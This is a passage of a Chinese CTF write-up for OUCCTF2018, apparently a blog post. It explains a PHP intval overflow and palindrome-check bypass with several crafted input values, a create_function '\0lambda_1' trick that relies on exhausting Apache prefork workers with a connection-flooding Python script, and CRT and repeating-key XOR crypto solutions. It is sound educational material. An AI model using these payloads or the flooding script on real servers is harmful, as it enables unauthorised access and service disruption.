class="string">&quot;number&quot;</span>][<span class="number">0</span>] !== <span class="string">&quot;+&quot;</span> &amp;&amp; <span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>][<span class="number">0</span>] !== <span class="string">&quot;-&quot;</span> <span class="comment">// 不能有正负号</span></span><br><span class="line"><span class="title function_ invoke__">intval</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>]) == <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">strrev</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>])) <span class="comment">// number 字符串反转后的 intval 必须和原来的 intval 相等</span></span><br><span class="line"><span class="title function_ invoke__">check</span>(<span class="variable">$request</span>[<span class="string">&quot;number&quot;</span>]) === <span class="literal">false</span></span><br></pre></td></tr></table></figure><p>前三个条件使得传入的 number 必须是一个回文数，类似 123321 这种的。看看 check 函数做了什么</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Do you know what it is doing?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$n</span></span>) </span>&#123;</span><br><span class="line">    <span class="variable">$n</span> = <span class="title function_ invoke__">strval</span>(<span class="variable">$n</span>); <span class="comment">// n 转成字符串</span></span><br><span class="line">    <span class="variable">$i</span> = <span class="number">0</span>; <span class="comment">// 计数器 i 从字符串起始位置开始</span></span><br><span class="line">    <span class="variable">$j</span> = <span class="title function_ invoke__">strlen</span>(<span class="variable">$n</span>) - <span class="number">1</span>; <span class="comment">// 计数器 j 从字符串最后一位开始</span></span><br><span class="line">    <span class="keyword">while</span>(<span class="variable">$i</span> &lt; <span class="variable">$j</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$n</span>[<span class="variable">$i</span>] !== <span class="variable">$n</span>[<span class="variable">$j</span>])</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        <span class="variable">$i</span>++; <span class="comment">// 从前往后移动</span></span><br><span class="line">        <span class="variable">$j</span>--; <span class="comment">// 从后往前移动</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>即 check 函数在检查输入字符串是否是回文字符串，如果是则返回 true，否则返回 false。那么在看上面的第四个条件，即该字符串不能是回文字符串，这就和第三个条件产生了冲突，因此该题突破点不是在第三个条件就是在第四个条件上。</p><blockquote><p>因为此题鄙人的设计不足，导致了很多非预期解（事实上只有一个队伍是按照预期解做的）</p></blockquote><p>鄙人直接讲一讲预期解的做法吧，首先需要知道 PHP 的底层是用 C 实现的，在 C 语言中关于数字的取值范围存在着一些问题，比如整数溢出。PHP 中的 intval 函数的作用是将一个字符串转为数字，但是在 32 位系统最大带符号的 int 值 2147483648，在 64 位系统上，最大带符号的 int 值是 9223372036854775807。那么可以试想一下，如果给 intval 函数一个特别大的参数，它会返回什么？</p><p>在 32 位的系统上，intval(‘1000000000000’)会返回 2147483647，可以发现当给 intval 的参数足够大的时候，它的返回值总是固定的，这样就可以绕过使用 intval 的判断语句，即只要输入的数大于等于 9223372036854775807，intval 函数总会返回 9223372036854775807。</p><p>下面来处理回文问题。9223372036854775807 经过 strrev 反转后是 7085774586302733229，无法构成溢出，所以需要在 9223372036854775807 前面加一个 0，反转之后为 70857745863027332290，这个数就足够 intval 溢出了，拿到 flag。</p><blockquote><p>flag{Wh4t_a_Mag1c_Numb3r}</p></blockquote><p>以下为其他队伍的非预期解</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">0e-0 // 反转后经过 intval 处理还是 0</span><br><span class="line">00e0 // 原理同上</span><br><span class="line">0.00 // 原理同上</span><br><span class="line">010000000000.00000000001 // 反转前与反转后的 intval 都为 10000000000</span><br><span class="line">9223372036854775807.0000000000000000000000000000000000000001 // 也是利用了溢出，反转后的 intval 为 1000000000000000000000000000000000000000，溢出得到 9223372036854775807</span><br><span class="line">%00%0c131 // 绕过 trim 和 is_numeric，原理是虽然最开始用了 trim 去除周围的空白字符，但是 PHP 底层函数中 trim 的实现并没有包含 \f（0x0c），而 is_numeric 函数在最开始会跳过传入参数的所有空白字符</span><br></pre></td></tr></table></figure><h2 id="Lambda"><a href="#Lambda" class="headerlink" title="Lambda"></a>Lambda</h2><blockquote><p>Orange will help you.</p></blockquote><p>不知道 Orange？Google 一下“Orange CTF”。此题源自 hitcon2015，Orange 出的一道题最后一部分, 这是 Orange 当年自己在 PHP 底层挖到的一个 0day。虽然 create_function 创建了一个匿名函数，但是在 PHP 内部匿名函数也是有名字的</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$func</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;echo 123;&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$func</span>);</span><br></pre></td></tr></table></figure><p><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180612111100.png"></p><p>可以看到创建的匿名函数的名字为”\0lambda_1”，再看 PHP 源码中对匿名函数名称的处理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function_name = zend_string_alloc(<span class="keyword">sizeof</span>(<span class="string">&quot;0lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="number">0</span>);</span><br><span class="line">        ZSTR_VAL(function_name)[<span class="number">0</span>] = <span class="string">&#x27;\0&#x27;</span>; <span class="comment">// 匿名函数的第一位被替换为 \0</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            ZSTR_LEN(function_name) = <span class="built_in">snprintf</span>(ZSTR_VAL(function_name) + <span class="number">1</span>, <span class="keyword">sizeof</span>(<span class="string">&quot;lambda_&quot;</span>)+MAX_LENGTH_OF_LONG, <span class="string">&quot;lambda_%d&quot;</span><span class="comment">/* 匿名函数体为 lambda_%d，%d 被格式化为 lambda_count+1*/</span>, ++EG(lambda_count)) + <span class="number">1</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span> (zend_hash_add_ptr(EG(function_table), function_name, func) == <span class="literal">NULL</span>);</span><br><span class="line">        RETURN_NEW_STR(function_name);</span><br></pre></td></tr></table></figure><p>可以看到在匿名函数的最前面被替换为 \0，中间为 lambda_，最后由 %d 格式化，这个 %d 为匿名函数的个数 +1，从 1 开始递增。</p><p>由于很多人都在同时做这个题，会同时创建很多个匿名函数，所以并不知道匿名函数的数量，也就不知道最后的 %d 被格式化到了多少，但是 Apache 中对于多进程有三种模式（prefork，worker 和 event），其中 prefork 为默认模式。现在来分析下 Apache-prefork 模式</p><p>prefork 的意思为”预先创建进程”，其官方介绍如下</p><blockquote><p>From: <a href="https://httpd.apache.org/docs/2.4/mod/prefork.html">https://httpd.apache.org/docs/2.4/mod/prefork.html</a><br>This Multi-Processing Module (MPM) implements a non-threaded, pre-forking web server. Each server process may answer incoming requests, and a parent process manages the size of the server pool. It is appropriate for sites that need to avoid threading for compatibility with non-thread-safe libraries. It is also the best MPM for isolating each request, so that a problem with a single request will not affect any other.<br>This MPM is very self-regulating, so it is rarely necessary to adjust its configuration directives. Most important is that MaxRequestWorkers be big enough to handle as many simultaneous requests as you expect to receive, but small enough to assure that there is enough physical RAM for all processes.</p></blockquote><p>Apache2.4 中 prefork 模式下的参数如下</p><p><img src="/2018/06/11/OUCCTF2018-Partial-Writeup/TIM%E6%88%AA%E5%9B%BE20180612114126.png"></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">IfModule</span> <span class="attr">mpm_prefork_module</span>&gt;</span></span><br><span class="line">    StartServers        5 # 启动时默认开启的进程数</span><br><span class="line">    MinSpareServers      5 # 最少空闲进程数</span><br><span class="line">    MaxSpareServers       10 # 最大空闲进程数</span><br><span class="line">    MaxRequestWorkers     150 # 并发最大请求数</span><br><span class="line">    MaxConnectionsPerChild   0 # 每个子进程在生命周期内所能够服务的最多请求个数</span><br><span class="line"><span class="tag">&lt;/<span class="name">IfModule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>当 Apache 启动后首先会启动 StartServers 个子进程，等待 1 秒后会再创建 2 个，再等待 1 秒后创建 4 个，以此类推直到创建到 MinSpareServers 个子进程为止，这些 fork 出的子进程会去等待用户连接，Apache 以此加快了处理用户请求的速度。</p><p>但如果一个用户发送了大量的 tcp 请求，占满了所有的 MaxRequestWorkers 后，Apache 在处理完所有的 MaxConnectionsPerChild 个 tcp 连接后会重新开启一个进程，而这个新的进程里的匿名函数的个数肯定是 1，这时再去带上匿名函数的名称（%00lambda_1）去访问就能得到 flag</p><blockquote><p>flag{An0nm0us_Func_1s_l4m6da}</p></blockquote><p>附 Orange 的 fork 脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding: UTF-8</span></span><br><span class="line"><span class="comment"># Author: orange@chroot.org</span></span><br><span class="line"><span class="comment"># /?func_name=%00lambda_1</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"><span class="keyword">from</span> multiprocessing.dummy <span class="keyword">import</span> Pool <span class="keyword">as</span> ThreadPool</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    requests.packages.urllib3.disable_warnings()</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">i</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">        HOST = <span class="string">&#x27;***.***.***.***&#x27;</span></span><br><span class="line">        PORT = *</span><br><span class="line">        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        s.connect((HOST, PORT))</span><br><span class="line">        s.sendall(</span><br><span class="line">            <span class="string">&#x27;GET / HTTP/1.1\nHost: ***.***.***.***\nConnection: Keep-Alive\n\n&#x27;</span>)</span><br><span class="line">        <span class="comment"># s.close()</span></span><br><span class="line">        <span class="built_in">print</span> <span class="string">&#x27;ok&#x27;</span></span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">i = <span class="number">8</span></span><br><span class="line">pool = ThreadPool(i)</span><br><span class="line">result = pool.map_async(run, <span class="built_in">range</span>(i)).get(<span class="number">0xffff</span>)</span><br></pre></td></tr></table></figure><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="CRT"><a href="#CRT" class="headerlink" title="CRT"></a>CRT</h2><blockquote><p>What is CRT? PS: I like Sun Tzu!</p></blockquote><p>不知道什么是 CRT？查一查。找不到和密码学有关的？Google “CRT Tzu”。此题主要考察了简单的中国剩余定理(孙子定理)。题目源码如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">&quot;flag&#123;&quot;</span>) // key 的开头是 flag&#123;</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">&quot;&#125;&quot;</span>) // key 的结尾是 &#125;</span><br><span class="line">    <span class="keyword">return</span> key[<span class="number">5</span>:-<span class="number">1</span>] // 最终的 key 为 flag&#123;&#125; 中括号之间的字符串 </span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(b)):</span><br><span class="line">            f.write(<span class="built_in">str</span>(a % b[i]) + <span class="string">&quot;\n&quot;</span>) // 用 a 模每一个 b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = check_key(flag.flag)</span><br><span class="line">    x = <span class="built_in">int</span>(key.encode(<span class="string">&quot;hex&quot;</span>), <span class="number">16</span>) // key 的<span class="number">16</span> 进制</span><br><span class="line">    y = [</span><br><span class="line">        <span class="number">0x101</span>, <span class="number">0x107</span>, <span class="number">0x10d</span>, <span class="number">0x10f</span>, <span class="number">0x115</span>,</span><br><span class="line">        <span class="number">0x119</span>, <span class="number">0x11b</span>, <span class="number">0x125</span>, <span class="number">0x133</span>, <span class="number">0x137</span>,</span><br><span class="line">        <span class="number">0x139</span>, <span class="number">0x13d</span>, <span class="number">0x14b</span>, <span class="number">0x151</span>, <span class="number">0x15b</span>,</span><br><span class="line">        <span class="number">0x15d</span>, <span class="number">0x161</span>, <span class="number">0x167</span>, <span class="number">0x16f</span>, <span class="number">0x175</span></span><br><span class="line">    ]</span><br><span class="line">    generate(x, y)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以发现源码中将 flag{}花括号中的字符串作为 key，转成十六进制数字之后去模 b 中的每一个值，作为结果放入密文中，也就是要解 20 个同余方程，利用中国剩余定理求解即可。不难判断出 y 数组中所有值都是两两互质的，解题脚本如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># Author: Srpopty</span></span><br><span class="line"><span class="comment"># Time: 2018.6.12</span></span><br><span class="line"><span class="comment"># Chinese remainder theorem(CRT)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> reduce</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Euclidean_ex</span>(<span class="params">a, b</span>):</span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>, <span class="number">0</span>, a</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        x, y, q = Euclidean_ex(b, a % b)</span><br><span class="line">        x, y = y, (x - (a // b) * y)</span><br><span class="line">        <span class="keyword">return</span> x, y, q</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Int2Str</span>(<span class="params">x</span>):</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">hex</span>(<span class="built_in">int</span>(x))[<span class="number">2</span>:-<span class="number">1</span>].decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    x = [</span><br><span class="line">        <span class="number">257</span>, <span class="number">263</span>, <span class="number">269</span>, <span class="number">271</span>,</span><br><span class="line">        <span class="number">277</span>, <span class="number">281</span>, <span class="number">283</span>, <span class="number">293</span>,</span><br><span class="line">        <span class="number">307</span>, <span class="number">311</span>, <span class="number">313</span>, <span class="number">317</span>,</span><br><span class="line">        <span class="number">331</span>, <span class="number">337</span>, <span class="number">347</span>, <span class="number">349</span>,</span><br><span class="line">        <span class="number">353</span>, <span class="number">359</span>, <span class="number">367</span>, <span class="number">373</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    y = [</span><br><span class="line">        <span class="number">222</span>, <span class="number">82</span>,  <span class="number">47</span>,  <span class="number">96</span>,</span><br><span class="line">        <span class="number">197</span>, <span class="number">29</span>,  <span class="number">122</span>, <span class="number">197</span>,</span><br><span class="line">        <span class="number">25</span>,  <span class="number">8</span>,   <span class="number">135</span>, <span class="number">175</span>,</span><br><span class="line">        <span class="number">174</span>, <span class="number">149</span>, <span class="number">77</span>,  <span class="number">345</span>,</span><br><span class="line">        <span class="number">66</span>,  <span class="number">112</span>, <span class="number">279</span>, <span class="number">129</span></span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    M = reduce(<span class="keyword">lambda</span> a, b: a * b, x)</span><br><span class="line">    Mi = [M//m <span class="keyword">for</span> m <span class="keyword">in</span> x]</span><br><span class="line"></span><br><span class="line">    Ti = [Euclidean_ex(Mi[i], x[i])[<span class="number">0</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x))]</span><br><span class="line"></span><br><span class="line">    result = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(x)):</span><br><span class="line">        result = (result + Mi[i] * Ti[i] * y[i]) % M</span><br><span class="line"></span><br><span class="line">    <span class="built_in">print</span> <span class="string">&quot;flag&#123;%s&#125;&quot;</span> % Int2Str(result)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><h2 id="Poem"><a href="#Poem" class="headerlink" title="Poem"></a>Poem</h2><p>题目源码如下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> flag</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">assert</span> key.startswith(<span class="string">&quot;flag&#123;&quot;</span>)</span><br><span class="line">    <span class="keyword">assert</span> key.endswith(<span class="string">&quot;&#125;&quot;</span>)</span><br><span class="line">    key = key[<span class="number">5</span>:-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">assert</span> <span class="built_in">len</span>(key) &gt; <span class="number">1</span> <span class="keyword">and</span> <span class="built_in">len</span>(key) &lt; <span class="number">50</span></span><br><span class="line">    <span class="keyword">return</span> key <span class="comment"># key 为 flag 中的字符串且 key 的长度大于 1 小于 50</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_plain</span>(<span class="params">plain</span>):</span><br><span class="line">    <span class="keyword">assert</span> re.<span class="keyword">match</span>(<span class="string">&#x27;[A-Za-z\s]*&#x27;</span>, plain) <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> plain <span class="comment"># 明文由英文字符和空白字符组成</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encryt</span>(<span class="params">key, plain</span>):</span><br><span class="line">    cipher = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(plain)):</span><br><span class="line">        <span class="comment"># 用 key 去循环异或加密明文</span></span><br><span class="line">        cipher += <span class="built_in">chr</span>(<span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)]) ^ <span class="built_in">ord</span>(plain[i]))</span><br><span class="line">    <span class="keyword">return</span> cipher</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_plain</span>():</span><br><span class="line">    plain = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;plain.txt&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            line = f.readline()</span><br><span class="line">            <span class="keyword">if</span> line:</span><br><span class="line">                plain += line</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> plain</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    key = check_key(flag.flag)</span><br><span class="line">    plain = check_plain(get_plain())</span><br><span class="line">    cipher = encryt(key, plain)</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;cipher.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(cipher.encode(<span class="string">&quot;base64&quot;</span>)) <span class="comment"># 将加密后的密文 base64 编码</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><p>可以看到这段代码主要做的就是用同一个 key 去对明文循环循环，并且已知条件如下</p><ol><li>key 的长度大于 1 小于 50</li><li>明文由英文及空白字符组成</li><li>密文</li></ol><p>原理：假设 key 为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">key = <span class="string">&#x27;xzy&#x27;</span></span><br></pre></td></tr></table></figure><p>假设明文 (plain) 为</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">plain = <span class="string">&#x27;abcdefg&#x27;</span></span><br></pre></td></tr></table></figure><p>使用 key 对 plain 进行循环异或，则(假设密文为 C)</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">C[<span class="number">0</span>] = <span class="string">&#x27;x&#x27;</span> ^ <span class="string">&#x27;a&#x27;</span></span><br><span class="line">C[<span class="number">1</span>] = <span class="string">&#x27;y&#x27;</span> ^ <span class="string">&#x27;b&#x27;</span></span><br><span class="line">C[<span class="number">2</span>] = <span class="string">&#x27;z&#x27;</span> ^ <span class="string">&#x27;c&#x27;</span></span><br><span class="line">C[<span class="number">3</span>] = <span class="string">&#x27;x&#x27;</span> ^ <span class="string">&#x27;d&#x27;</span></span><br><span class="line">C[<span class="number">4</span>] = <span class="string">&#x27;y&#x27;</span> ^ <span class="string">&#x27;e&#x27;</span></span><br><span class="line">C[<span class="number">5</span>] = <span class="string">&#x27;z&#x27;</span> ^ <span class="string">&#x27;f&#x27;</span></span><br><span class="line">C[<span class="number">6</span>] = <span class="string">&#x27;x&#x27;</span> ^ <span class="string">&#x27;g&#x27;</span></span><br></pre></td></tr></table></figure><p>整理一下（这里仅关注 key 的第一位’x’）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">C[<span class="number">0</span>] = <span class="string">&#x27;x&#x27;</span> ^ <span class="string">&#x27;a&#x27;</span></span><br><span class="line">C[<span class="number">3</span>] = <span class="string">&#x27;x&#x27;</span> ^ <span class="string">&#x27;d&#x27;</span></span><br><span class="line">C[<span class="number">6</span>] = <span class="string">&#x27;x&#x27;</span> ^ <span class="string">&#x27;g&#x27;</span></span><br></pre></td></tr></table></figure><p>根据异或的性质得</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;a&#x27;</span> = <span class="string">&#x27;x&#x27;</span> ^ C[<span class="number">0</span>]</span><br><span class="line"><span class="string">&#x27;d&#x27;</span> = <span class="string">&#x27;x&#x27;</span> ^ C[<span class="number">3</span>]</span><br><span class="line"><span class="string">&#x27;g&#x27;</span> = <span class="string">&#x27;x&#x27;</span> ^ C[<span class="number">6</span>]</span><br></pre></td></tr></table></figure><p>现在我们已知 C，并且知道明文 (‘a’,’b’,’c’这些) 的字符集，假设 k 为密钥，p 为明文，C 为密文</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p[<span class="number">0</span>] = k[<span class="number">0</span>] ^ C[<span class="number">0</span>]</span><br><span class="line">p[<span class="number">3</span>] = k[<span class="number">0</span>] ^ C[<span class="number">3</span>]</span><br><span class="line">p[<span class="number">6</span>] = k[<span class="number">0</span>] ^ C[<span class="number">6</span>]</span><br></pre></td></tr></table></figure><p>穷举有所 k 的长度(理论上从 1 到无穷，题目中告诉了从 1 到 50)，在每一个 k 长度中对 k 的每一个字符进行穷举（从 0 到 255）<br>k 中每个字符与 C 中对应字符进行异或，计算出明文 p，看 p 中多少字符在已知的明文字符集中，利用字频分析确定该穷举出的结果是否最优，穷举结束后取最优的一次穷举结果</p><p>理论上越接近 key 的真实长度，解密出的明文字符集越接近真实明文字符集，解题脚本如下（字频分析法的变种）：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span 